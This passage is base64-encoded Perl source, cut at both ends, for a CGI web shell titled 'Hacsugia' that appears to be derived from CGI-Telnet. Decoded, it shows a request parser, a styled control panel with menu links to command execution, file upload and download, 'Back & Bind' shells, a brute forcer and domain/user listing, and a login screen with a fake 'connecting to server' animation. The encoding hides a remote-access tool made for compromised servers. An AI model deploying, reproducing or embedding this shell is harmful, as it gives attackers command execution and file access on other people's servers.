G9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kKIyBzY3JpcHRzLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBSZWFkUGFyc2UgCnsKCWxvY2FsICgqaW4pID0gQF8gaWYgQF87Cglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOwoJCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsKCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQoJewoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9OwoJfQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpCgl7CgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOwoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7Cgl9CgoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pCgl7CgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyAKCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyAKCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOwoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsKCQkkSGVhZGVyID0gJGA7CgkJJEJvZHkgPSAkJzsKIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5OwoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgCgkJJGlueydmJ30gPSAkMTsgCgkJJGlueydmJ30gPX4gcy9cIi8vZzsKCQkkaW57J2YnfSA9fiBzL1xzLy9nOwoKCQkjIHBhcnNlIHRyYWlsZXIKCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQoJCXsgCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOwoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87CgkJCSRrZXkgPSAkMTsKCQkJJHZhbCA9ICQnOwoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gPSAkdmFsOyAKCQl9Cgl9CgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkKCXsKCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7CgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQoJCXsKCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsKCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsKCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7CgkJCSRpbnska2V5fSAuPSAkdmFsOwoJCX0KCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcgojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlSGVhZGVyCnsKCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOwoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCW15ICRkaXIgPSRDdXJyZW50RGlyOwoJJGRpcj1+IHMvXFwvXFxcXC9nOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+Cjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+CgokSHRtbE1ldGFIZWFkZXIKCjwvaGVhZD4KPHN0eWxlPgpib2R5ewpmb250OiAxMHB0IFZlcmRhbmE7Cn0KdHIgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICNmZjk5MDA7Cn0KdGQgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICMyQkE4RUM7CmZvbnQ6IDEwcHQgVmVyZGFuYTsKfQoKdGFibGUgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKQkFDS0dST1VORC1DT0xPUjogIzExMTsKfQoKCmlucHV0IHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOwpmb250OiAxMHB0IFZlcmRhbmE7CmNvbG9yOiAjZmY5OTAwOwp9CgppbnB1dC5zdWJtaXQgewp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47CmNvbG9yOiAjRkZGRkZGOwpib3JkZXItY29sb3I6ICMwMDk5MDA7Cn0KCmNvZGUgewpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOwpjb2xvcjogd2hpbGU7Cn0KCnJ1biB7CmJvcmRlcgkJCTogZGFzaGVkIDBweCAjMzMzOwpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsKY29sb3I6ICNGRjAwQUE7Cn0KCnRleHRhcmVhIHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7CmZvbnQ6IEZpeGVkc3lzIGJvbGQ7CmNvbG9yOiAjYWFhOwp9CkE6bGluayB7CglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTp2aXNpdGVkIHsKCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmhvdmVyIHsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmFjdGl2ZSB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQoKLmxpc3RkaXIgdHI6aG92ZXJ7CgliYWNrZ3JvdW5kOiAjNDQ0Owp9Ci5saXN0ZGlyIHRyOmhvdmVyIHRkewoJYmFja2dyb3VuZDogIzQ0NDsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7Cn0KLm5vdGxpbmV7CgliYWNrZ3JvdW5kOiAjMTExOwp9Ci5saW5lewoJYmFja2dyb3VuZDogIzIyMjsKfQo8L3N0eWxlPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpCnsKCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLwoJdmFyIGFqYXg9IiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpCnsKCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOwp9CmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQp7Cgl2YXIgYWpheD0iIjsKCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOwoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpCnsKCWlmKGY9PSdmJykKCXsKCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsKCX1lbHNlCgl7CgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOwoJfQp9Cjwvc2NyaXB0Pgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPGNlbnRlcj48Y29kZT4KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+Cjx0cj4KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTI+CgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4KCTwvdGQ+CgoJPHRkPgoKCQk8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4KCTwvdGQ+Cgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjY2MwMDAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iIzAwMDAwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4KCTwvdGQ+Cgo8L3RyPgoKPHRyPgo8dGQgY29sc3Bhbj0iMyI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1ndWkmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkdVSTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwKPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9IiMiPkhlbHA8L2E+Cgo8L2ZvbnQ+PC90ZD4KPC90cj4KPC90YWJsZT4KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCglwcmludCA8PEVORDsKPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7CiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsKICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4KICAgIHJldHVybjsKICB9CiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsKICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsKICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsKICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsKICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0OwogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsKICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7CiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOwogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsKICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOwogIHRoaXMucnVubmluZyA9IGZhbHNlOwogIHRoaXMuaW5UYWcgPSBmYWxzZTsKICB0aGlzLnRhZ0J1ZmZlciA9ICIiOwogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7CiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7Cn0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsKVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOwpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgewogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7Cn0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7CiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47CiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuCiAgICByZXR1cm47CiAgfQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsKLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0LgogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgewogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOwogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOwogICAgICB0aGlzLmluVGFnID0gZmFsc2U7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOwogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSB7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICB9CiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsKICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsKICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsKICB9IGVsc2UgewoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOwoJdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7CiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7CiAgfQp9Cjwvc2NyaXB0Pgo8L3ByZT4KCjxmb250IHN0eWxlPSJmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7Ij5Db3B5cmlnaHQgKEMpIDIwMDEgUm9oaXRhYiBCYXRyYSA8L2ZvbnQ+PGJyPjxicj4KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+Cjx0Ym9keT48dHI+Cjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4KCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+Cgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgoKPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+Cjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+CjwvdHI+CjwvdGJvZHk+PC90YWJsZT4KPGJyPgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsKVHlwaW5nVGV4dC5ydW5BbGwoKTsKCjwvc2NyaXB0PgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0